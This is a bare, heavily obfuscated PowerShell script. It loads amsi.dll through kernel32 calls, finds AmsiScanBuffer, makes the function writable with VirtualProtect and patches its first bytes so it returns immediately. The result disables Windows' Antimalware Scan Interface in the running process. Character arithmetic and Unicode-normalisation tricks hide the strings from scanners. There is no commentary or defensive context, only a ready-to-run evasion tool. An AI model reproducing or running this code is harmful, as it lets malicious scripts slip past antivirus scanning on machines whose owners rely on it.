$JN6jKIH = @"
using System;
using System.Runtime.InteropServices;
public class JN6jKIH {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr VzoAIThq7L39sQHylysS, string ovRc92xZLl);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr O_pPdw_g4, UIntPtr CIMPMhJL9, uint HXFqw5MUX_WWaW, out uint HELClCVX);
}
"@

Add-Type $JN6jKIH

$oYMl218 = [JN6jKIH]::LoadLibrary("$([cHAR](41+56)+[cHaR](109*84/84)+[cHAR](64+51)+[ChAr]([BytE]0x69)+[CHar]([BYTE]0x2e)+[chAR](100*70/70)+[cHaR]([BYTe]0x6c)+[chAr](108*65/65))")
$tQanckYV92 = [JN6jKIH]::GetProcAddress($oYMl218, "$(('ÀmsìScâ'+'nBùffèr').nORMALiZe([chAr]([byte]0x46)+[ChAR](111)+[chAr](114*42/42)+[cHAR]([BYTE]0x6d)+[ChAR](68+23-23)) -replace [CHAR](92)+[chAR](112)+[chaR](123)+[chaR](77*67/67)+[cHaR]([byTE]0x6e)+[ChaR](45+80))")
$p = 0
[JN6jKIH]::VirtualProtect($tQanckYV92, [uint32]5, 0x40, [ref]$p)
$Kn8syarc0A6K17s = "0xB8"
$wvFLH5rOqpO4Lr09AS = "0x57"
$VlW6GWAmww = "0x00"
$VS2ZknSt8t = "0x07"
$fktKE4CszS0fG = "0x80"
$jje5Y9s = "0xC3"
$Tx5Jp__HO7cXif8GO6g7 = [Byte[]] ($Kn8syarc0A6K17s,$wvFLH5rOqpO4Lr09AS,$VlW6GWAmww,$VS2ZknSt8t,+$fktKE4CszS0fG,+$jje5Y9s)
[System.Runtime.InteropServices.Marshal]::Copy($Tx5Jp__HO7cXif8GO6g7, 0, $tQanckYV92, 6)